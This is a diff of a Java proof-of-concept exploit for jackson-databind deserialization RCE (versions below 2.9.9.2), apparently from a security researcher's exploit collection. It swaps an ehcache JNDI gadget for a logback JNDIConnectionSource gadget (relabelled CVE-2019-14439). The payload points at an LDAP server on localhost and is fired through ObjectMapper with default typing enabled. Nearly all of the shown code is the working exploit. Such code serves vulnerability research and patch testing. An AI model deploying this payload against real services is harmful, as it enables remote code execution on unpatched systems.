+++ jackson/src/main/java/com/threedr3am/bug/jackson/rce/LogbackJndi.java
@@ -1,4 +1,4 @@
-package com.threedr3am.bug.jackson;
+package com.threedr3am.bug.jackson.rce;
 
 import com.fasterxml.jackson.databind.ObjectMapper;
 import com.threedr3am.bug.common.server.LdapServer;
@@ -6,11 +6,13 @@ import com.threedr3am.bug.common.server.RmiServer;
 import java.io.IOException;
 
 /**
- * CVE-2019-14379
- * jackson-databind RCE < 2.9.9.2
+ * logback jndi rce jackson < 2.9.9.2
+ *
+ * CVE-2019-14439
+ *
  * @author threedr3am
  */
-public class EhcacheJndi {
+public class LogbackJndi {
   static {
     //rmi server示例
 //    RmiServer.run();
@@ -21,12 +23,10 @@ public class EhcacheJndi {
 
   public static void main(String[] args) throws IOException {
 
-    String json = "[\"net.sf.ehcache.transaction.manager.DefaultTransactionManagerLookup\"," +
-        "{\"properties\":{\"jndiName\":\"ldap://localhost:43658/Calc\"}}]";
+    String json = "[\"ch.qos.logback.core.db.JNDIConnectionSource\",{\"jndiLocation\":\"ldap://localhost:43658/Calc\"}]";
     ObjectMapper mapper = new ObjectMapper();
     mapper.enableDefaultTyping();
     Object o = mapper.readValue(json, Object.class);
     mapper.writeValueAsString(o);
-
   }
 }
